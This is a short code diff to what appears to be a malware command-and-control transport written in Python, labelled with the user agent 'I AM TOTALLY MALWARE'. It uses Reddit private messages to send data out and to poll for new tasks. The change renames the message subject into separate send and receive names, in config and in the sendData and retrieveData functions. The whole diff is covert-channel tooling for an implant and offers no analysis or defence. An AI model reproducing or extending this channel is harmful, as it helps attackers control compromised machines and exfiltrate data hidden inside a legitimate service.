@@ -13,7 +13,8 @@ CLIENT_SECRET = ""
 PASSWORD = ""
 USER_AGENT = "I AM TOTALLY MALWARE by /u/"
 USERNAME = ""
-SUBJECT_NAME = "New4You" # Subject of PM
+SEND_NAME = "New4You" # Subject of PM
+RECV_NAME = "Resp4You"
 # END OF CONFIG
 
 # IF YOU NEED DEBUG LOGGING:
@@ -45,7 +46,7 @@ def prepTransport():
 def sendData(data):
 	# Because we're keeping the taskid, we can easily support parsing multiple
 	#    tasks later
-	reddit.redditor(USERNAME).message(SUBJECT_NAME, data)
+	reddit.redditor(USERNAME).message(SEND_NAME, data)
 	return 0
 
 
@@ -60,7 +61,7 @@ def retrieveData():
 				sleep(5)
 				pass
 			# Got our new task
-			if message.subject == SUBJECT_NAME:
+			if message.subject == RECV_NAME:
 				task = message.body
 				TASK_ID = message.id
 				break
